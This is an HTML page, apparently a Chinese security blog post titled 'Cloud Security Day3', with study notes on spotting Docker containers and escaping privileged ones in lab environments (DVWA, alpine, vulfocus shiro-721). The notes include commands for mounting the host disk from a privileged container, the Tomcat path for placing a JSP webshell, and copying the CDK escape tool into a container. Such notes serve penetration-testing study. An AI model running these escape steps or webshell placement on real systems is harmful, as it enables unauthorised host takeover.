@@ -1,0 +1,721 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="https://kcide.asia/PicGo/20250521164813069.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="XCDH">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Docket介绍：Docker容器与虚拟机类似，但两者在原理上不同，容器是将操作系统层虚拟化，虚拟机则是虚拟化硬件，因此容器更具有便携性，高效的利用服务器 Docker所面临的风险： 不安全的第三方组件 不安全的镜像 敏感信息泄露   前渗透： 判断在Docker中(看后面的内容) 没有拿到权限：端口扫描详细信息，根据应用对象表现 拿到权限：需要注意的是，如果你获取的shell权限过小的话(www">
+<meta property="og:type" content="article">
+<meta property="og:title" content="云安全Day3">
+<meta property="og:url" content="http://example.com/2025/05/29/%E4%BA%91%E5%AE%89%E5%85%A8Day3/index.html">
+<meta property="og:site_name" content="XCDH">
+<meta property="og:description" content="Docket介绍：Docker容器与虚拟机类似，但两者在原理上不同，容器是将操作系统层虚拟化，虚拟机则是虚拟化硬件，因此容器更具有便携性，高效的利用服务器 Docker所面临的风险： 不安全的第三方组件 不安全的镜像 敏感信息泄露   前渗透： 判断在Docker中(看后面的内容) 没有拿到权限：端口扫描详细信息，根据应用对象表现 拿到权限：需要注意的是，如果你获取的shell权限过小的话(www">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-05-30_01-07-39.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-05-29_13-34-20.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-05-29_17-18-59.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-05-29_17-24-25.png">
+<meta property="article:published_time" content="2025-05-29T02:22:54.000Z">
+<meta property="article:modified_time" content="2025-05-29T17:20:14.312Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="云服务篇">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/Snipaste_2025-05-30_01-07-39.png">
+  
+  
+  
+  <title>云安全Day3 - XCDH</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>XCDH</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://kcide.asia/PicGo/20250521153237608.jpeg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="云安全Day3"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-29 10:22" pubdate>
+          2025年5月29日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">云安全Day3</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="Docket介绍："><a href="#Docket介绍：" class="headerlink" title="Docket介绍："></a>Docket介绍：</h2><p>Docker容器与虚拟机类似，但两者在原理上不同，容器是将操作系统层虚拟化，虚拟机则是虚拟化硬件，因此容器更具有便携性，高效的利用服务器</p>
+<h2 id="Docker所面临的风险："><a href="#Docker所面临的风险：" class="headerlink" title="Docker所面临的风险："></a>Docker所面临的风险：</h2><ol>
+<li>不安全的第三方组件</li>
+<li>不安全的镜像</li>
+<li>敏感信息泄露</li>
+</ol>
+<p><img src="/./img/Snipaste_2025-05-30_01-07-39.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="前渗透："><a href="#前渗透：" class="headerlink" title="前渗透："></a>前渗透：</h2><ol>
+<li>判断在Docker中(看后面的内容)<ol>
+<li>没有拿到权限：端口扫描详细信息，根据应用对象表现</li>
+<li>拿到权限：需要注意的是，如果你获取的shell权限过小的话(www-data、或是某一服务的用户)，根目录下也是不存在.dockerenv文件的</li>
+</ol>
+</li>
+<li>镜像中的应用的漏洞</li>
+<li>镜像中的默认配置</li>
+</ol>
+<h2 id="后渗透："><a href="#后渗透：" class="headerlink" title="后渗透："></a>后渗透：</h2><ol>
+<li>特权模式启动导致（不安全启动 适用于java jsp高权限无需提权 还要提权才能逃逸） </li>
+<li>危险挂载启动导致（危险启动 适用于java jsp高权限无需提权 还要提权才能逃逸） </li>
+<li>Docker自身&amp;系统漏洞（软件漏洞和系统漏洞 都可用）</li>
+</ol>
+<p>补充：如果Docker拉取镜像缓慢，可以试试阿里云提供的镜像加速器</p>
+<p><a target="_blank" rel="noopener" href="https://wiki.teamssix.com/CloudNative/Docker/docker-use-notes.html">https://wiki.teamssix.com/CloudNative/Docker/docker-use-notes.html</a></p>
+<p>启动docker：</p>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[root@localhost ~]</span># docker images<br>sagikazarmark/dvwa      latest                 e901498e651a   8 years ago   359MB<br><span class="hljs-comment">[root@localhost ~]</span># docker run -it -p 8080:80  sagikazarmark/dvwa <br><span class="hljs-comment">[ ok ]</span> Starting MySQL database server: mysqld . ..<br><span class="hljs-comment">[info]</span> Checking for tables which need an upgrade, <span class="hljs-keyword">are</span> corrupt or were <br>not <span class="hljs-keyword">closed</span> cleanly..<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="Docker逃逸：（拿到权限后的操作）"><a href="#Docker逃逸：（拿到权限后的操作）" class="headerlink" title="Docker逃逸：（拿到权限后的操作）"></a>Docker逃逸：（拿到权限后的操作）</h2><p>逃逸不是提权（除非利用的漏洞带有提权才算是提权）</p>
+<h2 id="一-如何知道自己是在docker里面？"><a href="#一-如何知道自己是在docker里面？" class="headerlink" title="一.如何知道自己是在docker里面？"></a>一.如何知道自己是在docker里面？</h2><h5 id="1-1-查询cgroup信息："><a href="#1-1-查询cgroup信息：" class="headerlink" title="1.1 查询cgroup信息："></a>1.1 查询cgroup信息：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/1/cgroup<br></code></pre></td></tr></table></figure>
+
+<p>会有docker字样的出现：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ruby">www-data<br>/var/www/html/hackable/uploads/ &gt;cat /<span class="hljs-built_in">proc</span>/<span class="hljs-number">1</span>/cgroup<br><span class="hljs-number">11</span><span class="hljs-symbol">:devices</span><span class="hljs-symbol">:/docker/a7bbeba3c52b85a2a24274cd9240205045de6f809c3437880a5239b5deac5a6a</span><br><span class="hljs-number">10</span><span class="hljs-symbol">:cpuacct</span>,<span class="hljs-symbol">cpu:</span>/docker/a7bbeba3c52b85a2a24274cd9240205045de6f809c3437880a5239b5deac5a6a<br><span class="hljs-number">9</span><span class="hljs-symbol">:memory</span><span class="hljs-symbol">:/docker/a7bbeba3c52b85a2a24274cd9240205045de6f809c3437880a5239b5deac5a6a</span><br><span class="hljs-number">8</span><span class="hljs-symbol">:cpuset</span><span class="hljs-symbol">:/docker/a7bbeba3c52b85a2a24274cd9240205045de6f809c3437880a5239b5deac5a6a</span><br><span class="hljs-number">7</span><span class="hljs-symbol">:blkio</span><span class="hljs-symbol">:/docker/a7bbeba3c52b85a2a24274cd9240205045de6f809c3437880a5239b5deac5a6a</span><br><span class="hljs-number">6</span><span class="hljs-symbol">:perf_event</span><span class="hljs-symbol">:/docker/a7bbeba3c52b85a2a24274cd9240205045de6f809c3437880a5239b5deac5a6a</span><br><span class="hljs-number">5</span><span class="hljs-symbol">:hugetlb</span><span class="hljs-symbol">:/docker/a7bbeba3c52b85a2a24274cd9240205045de6f809c3437880a5239b5deac5a6a</span><br><span class="hljs-number">4</span><span class="hljs-symbol">:pids</span><span class="hljs-symbol">:/docker/a7bbeba3c52b85a2a24274cd9240205045de6f809c3437880a5239b5deac5a6a</span><br><span class="hljs-number">3</span><span class="hljs-symbol">:freezer</span><span class="hljs-symbol">:/docker/a7bbeba3c52b85a2a24274cd9240205045de6f809c3437880a5239b5deac5a6a</span><br><span class="hljs-number">2</span><span class="hljs-symbol">:net_prio</span>,<span class="hljs-symbol">net_cls:</span>/docker/a7bbeba3c52b85a2a24274cd9240205045de6f809c3437880a5239b5deac5a6a<br><span class="hljs-number">1</span><span class="hljs-symbol">:name=systemd</span><span class="hljs-symbol">:/docker/a7bbeba3c52b85a2a24274cd9240205045de6f809c3437880a5239b5deac5a6a</span><br>/var/www/html/hackable/uploads/ &gt;<br></code></pre></td></tr></table></figure>
+
+<p>注意：有可能因为权限问题可能会查不出来，如下图所示：</p>
+<p><img src="/./img/Snipaste_2025-05-29_13-34-20.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="1-2-检查-dockerenv文件-主要"><a href="#1-2-检查-dockerenv文件-主要" class="headerlink" title="1.2 检查 &#x2F;.dockerenv文件 (主要)"></a>1.2 检查 &#x2F;.dockerenv文件 (主要)</h5><p>通过判断根目录下的 .dockerenv 文件是否存在，可以简单的识别docker环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -alh /.dockerenv<br></code></pre></td></tr></table></figure>
+
+<p>有 &#x2F;.dockerenv 文件，在docker容器中</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>hackable<span class="hljs-regexp">/uploads/</span> &gt;ls -alh /.dockerenv<br>-rwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">0</span> May <span class="hljs-number">29</span> <span class="hljs-number">05</span>:<span class="hljs-number">17</span> /.dockerenv<br><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>hackable<span class="hljs-regexp">/uploads/</span> &gt;<br></code></pre></td></tr></table></figure>
+
+<h5 id="1-3-查看硬盘信息"><a href="#1-3-查看硬盘信息" class="headerlink" title="1.3 查看硬盘信息"></a>1.3 查看硬盘信息</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">fdisk</span> -l <br>容器输出为空，非容器有内容输出。<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="二-容器逃逸-特权模式"><a href="#二-容器逃逸-特权模式" class="headerlink" title="二. 容器逃逸-特权模式"></a>二. 容器逃逸-特权模式</h2><p><a target="_blank" rel="noopener" href="https://wiki.teamssix.com/CloudNative/Docker/docker-privileged-escape.html">https://wiki.teamssix.com/CloudNative/Docker/docker-privileged-escape.html</a></p>
+<p>启动靶场：docker run –rm –privileged&#x3D;true -it alpine </p>
+<blockquote>
+<p>–privileged&#x3D;true：会让容器内的进程获得宿主机上几乎所有的特权，相当于容器内的 	root用户等同于宿主机的 root 用户</p>
+<p>alpine：简单的一个容器（基于Alpine Linux的最小Docker镜像）</p>
+</blockquote>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix">[root@localhost ~]<span class="hljs-comment"># docker pull alpine</span><br>Using default <span class="hljs-params">tag:</span> latest<br><span class="hljs-params">latest:</span> Pulling from library<span class="hljs-symbol">/alpine</span><br><span class="hljs-params">f18232174bc9:</span> Pull complete <br><span class="hljs-params">Digest:</span> sha256:a8560b36e8b8210634f77d9f7f9efd7ffa463e380b75e2e74aff4511df3ef88c<br><span class="hljs-params">Status:</span> Downloaded newer image for alpine:latest<br>docker.io<span class="hljs-operator">/</span>library<span class="hljs-operator">/</span>alpine:latest<br>[root@localhost ~]<span class="hljs-comment"># docker run --rm --privileged=true -it alpine </span><br><span class="hljs-symbol">/</span> <span class="hljs-comment"># whoami</span><br>root<br><span class="hljs-symbol">/</span> <span class="hljs-comment"># ls</span><br>bin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var<br><span class="hljs-symbol">/</span> <span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<p>逃离前攻击者角度的思考：</p>
+<p>第一是不是docker环境？，第二他是不是特权模式下？</p>
+<ol>
+<li><p>在docker环境下查找 .dockerenv 文件  （和上面的进行结合使用）</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs tap">/ <span class="hljs-comment"># ls -al</span><br>total 8<br>drwxr-xr-x   <span class="hljs-number"> 1 </span>root     root           <span class="hljs-number"> 30 </span>May<span class="hljs-number"> 29 </span>05:55 .<br>drwxr-xr-x   <span class="hljs-number"> 1 </span>root     root           <span class="hljs-number"> 30 </span>May<span class="hljs-number"> 29 </span>05:55 ..<br>-rwxr-xr-x   <span class="hljs-number"> 1 </span>root     root            <span class="hljs-number"> 0 </span>May<span class="hljs-number"> 29 </span>05:55 .dockerenv<br>drwxr-xr-x   <span class="hljs-number"> 2 </span>root     root         <span class="hljs-number"> 4096 </span>Feb<span class="hljs-number"> 13 </span>23:04 bin<br>drwxr-xr-x  <span class="hljs-number"> 15 </span>root     root         <span class="hljs-number"> 3100 </span>May<span class="hljs-number"> 29 </span>05:55 dev<br>drwxr-xr-x   <span class="hljs-number"> 1 </span>root     root           <span class="hljs-number"> 66 </span>May<span class="hljs-number"> 29 </span>05:55 etc<br>drwxr-xr-x   <span class="hljs-number"> 1 </span>root     root           <span class="hljs-number"> 18 </span>May<span class="hljs-number"> 29 </span>05:58 home<br>drwxr-xr-x   <span class="hljs-number"> 6 </span>root     root          <span class="hljs-number"> 127 </span>Feb<span class="hljs-number"> 13 </span>23:04 lib<br>drwxr-xr-x   <span class="hljs-number"> 5 </span>root     root           <span class="hljs-number"> 44 </span>Feb<span class="hljs-number"> 13 </span>23:04 media<br>drwxr-xr-x   <span class="hljs-number"> 2 </span>root     root            <span class="hljs-number"> 6 </span>Feb<span class="hljs-number"> 13 </span>23:04 mnt<br>drwxr-xr-x   <span class="hljs-number"> 2 </span>root     root            <span class="hljs-number"> 6 </span>Feb<span class="hljs-number"> 13 </span>23:04 opt<br>dr-xr-xr-x <span class="hljs-number"> 205 </span>root     root            <span class="hljs-number"> 0 </span>May<span class="hljs-number"> 29 </span>05:55 proc<br>drwx------   <span class="hljs-number"> 1 </span>root     root           <span class="hljs-number"> 26 </span>May<span class="hljs-number"> 29 </span>05:56 root<br>drwxr-xr-x   <span class="hljs-number"> 3 </span>root     root           <span class="hljs-number"> 18 </span>Feb<span class="hljs-number"> 13 </span>23:04 run<br>drwxr-xr-x   <span class="hljs-number"> 2 </span>root     root         <span class="hljs-number"> 4096 </span>Feb<span class="hljs-number"> 13 </span>23:04 sbin<br>drwxr-xr-x   <span class="hljs-number"> 2 </span>root     root            <span class="hljs-number"> 6 </span>Feb<span class="hljs-number"> 13 </span>23:04 srv<br>dr-xr-xr-x  <span class="hljs-number"> 13 </span>root     root            <span class="hljs-number"> 0 </span>May<span class="hljs-number"> 29 </span>05:55 sys<br>drwxrwxrwt   <span class="hljs-number"> 2 </span>root     root            <span class="hljs-number"> 6 </span>Feb<span class="hljs-number"> 13 </span>23:04 tmp<br>drwxr-xr-x   <span class="hljs-number"> 7 </span>root     root           <span class="hljs-number"> 66 </span>Feb<span class="hljs-number"> 13 </span>23:04 usr<br>drwxr-xr-x  <span class="hljs-number"> 11 </span>root     root          <span class="hljs-number"> 137 </span>Feb<span class="hljs-number"> 13 </span>23:04 var<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p>2.判断是不是特权模式</p>
+<p><a target="_blank" rel="noopener" href="https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html">https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html</a></p>
+<h4 id="检测："><a href="#检测：" class="headerlink" title="检测："></a>检测：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/self/status | grep CapEff<br></code></pre></td></tr></table></figure>
+
+<p>在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff</p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tcl">/ # cat /<span class="hljs-keyword">proc</span>/self/status |<span class="hljs-title"> grep</span> CapEff<span class="hljs-title"></span><br><span class="hljs-title">CapEff:</span>	000001ffffffffff<br>/ #<span class="hljs-title"> fdisk</span> -l<span class="hljs-title"></span><br><span class="hljs-title">Disk</span> /dev/sda: 80<span class="hljs-title"> GB,</span> 86000000000<span class="hljs-title"> bytes,</span> 167968750<span class="hljs-title"> sectors</span><br>329350<span class="hljs-title"> cylinders,</span> 255<span class="hljs-title"> heads,</span> 2<span class="hljs-title"> sectors/track</span><br>Units:<span class="hljs-title"> sectors</span> of 1 * 512 = 512<span class="hljs-title"> bytes</span><br><span class="hljs-title"></span><br><span class="hljs-title">Device</span> <span class="hljs-title"> Boot</span> StartCHS<span class="hljs-title">    EndCHS</span> <span class="hljs-title">       StartLBA</span> <span class="hljs-title">    EndLBA</span> <span class="hljs-title">   Sectors</span> <span class="hljs-title"> Size</span> Id<span class="hljs-title"> Type</span><br>/dev/sda1 *  4,4,1       1023,254,2        2048  167968749  167966702 80.0G 83<span class="hljs-title"> Linux</span><br>/ #<span class="hljs-title"> mkdir</span> /demo1 &amp;&amp;<span class="hljs-title"> mount</span> /dev/sda1 /demo1<br>/ #<span class="hljs-title"> ls</span> /demo/<span class="hljs-title"></span><br><span class="hljs-title">bin</span> <span class="hljs-title">            dev</span> <span class="hljs-title">            initrd.img</span> <span class="hljs-title">     lib32</span> <span class="hljs-title">          media</span> <span class="hljs-title">          proc</span> <span class="hljs-title">           sbin</span> <span class="hljs-title">           sys</span> <span class="hljs-title">            var</span><br>boot<span class="hljs-title">            etc</span> <span class="hljs-title">            initrd.img.old</span> <span class="hljs-title"> lib64</span> <span class="hljs-title">          mnt</span> <span class="hljs-title">            root</span> <span class="hljs-title">           srv</span> <span class="hljs-title">            tmp</span> <span class="hljs-title">            vmlinuz</span><br>demo.txt<span class="hljs-title">        home</span> <span class="hljs-title">           lib</span> <span class="hljs-title">            lost+found</span> <span class="hljs-title">     opt</span> <span class="hljs-title">            run</span> <span class="hljs-title">            swapfile</span> <span class="hljs-title">       usr</span> <span class="hljs-title">            vmlinuz.old</span><br>/ # <br><br></code></pre></td></tr></table></figure>
+
+<p>demo.txt 是 物理机在linux中添加的文件，现在在docker中也可以进行访问</p>
+<h2 id="三-容器逃逸-危险挂载（Docker-Socke）"><a href="#三-容器逃逸-危险挂载（Docker-Socke）" class="headerlink" title="三. 容器逃逸-危险挂载（Docker Socke）"></a>三. 容器逃逸-危险挂载（Docker Socke）</h2><p>在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部</p>
+<p><a target="_blank" rel="noopener" href="https://wiki.teamssix.com/CloudNative/Docker/docker-socket-escape.html">https://wiki.teamssix.com/CloudNative/Docker/docker-socket-escape.html</a></p>
+<h2 id="四-容器逃逸-挂载宿主机-procfs-逃逸"><a href="#四-容器逃逸-挂载宿主机-procfs-逃逸" class="headerlink" title="四. 容器逃逸-挂载宿主机 procfs 逃逸"></a>四. 容器逃逸-挂载宿主机 procfs 逃逸</h2><p><a target="_blank" rel="noopener" href="https://wiki.teamssix.com/cloudnative/docker/docker-procfs-escape.html">https://wiki.teamssix.com/cloudnative/docker/docker-procfs-escape.html</a></p>
+<p>实战：</p>
+<p>1.准备一台靶机（有shiro漏洞的 VM）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull vulfocus/shiro-721<br>启动靶机（特权模式启动）：<br>docker run --<span class="hljs-built_in">rm</span> --privileged=<span class="hljs-literal">true</span> -it -p 8888:8080 vulfocus/shiro-721   <br></code></pre></td></tr></table></figure>
+
+<p>使用shiro工具梭哈，发现是root权限，但是处于docker中，进行docker逃逸</p>
+<p><img src="/./img/Snipaste_2025-05-29_17-18-59.png" srcset="/img/loading.gif" lazyload></p>
+<p>方法一：使用特权模式</p>
+<p>1.检测当前是不是特权模式</p>
+<p><img src="/./img/Snipaste_2025-05-29_17-24-25.png" srcset="/img/loading.gif" lazyload></p>
+<p>2.和特权模式相似…</p>
+<p>注意：java大部分都是高权限，php需提权……如果docker中不是root用户，就不能进行逃离，权限不够，所以逃离一般都是java的网站</p>
+<h2 id="有用的东西："><a href="#有用的东西：" class="headerlink" title="有用的东西："></a>有用的东西：</h2><h4 id="Webshell上传目录-本机传给docker文件："><a href="#Webshell上传目录-本机传给docker文件：" class="headerlink" title="Webshell上传目录 &#x2F; 本机传给docker文件："></a>Webshell上传目录 &#x2F; 本机传给docker文件：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker默认的目录是：/usr/local/tomcat/webapps/ROOT/木马.jsp<br>docker_IP：8080/木马.jsp<br><br>[java@localhost tmp]$ <span class="hljs-built_in">sudo</span> docker <span class="hljs-built_in">cp</span> cdk_linux_amd64 841d2cad0001:/<br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> java: <br>Successfully copied 12MB to 841d2cad0001:/<br></code></pre></td></tr></table></figure>
+
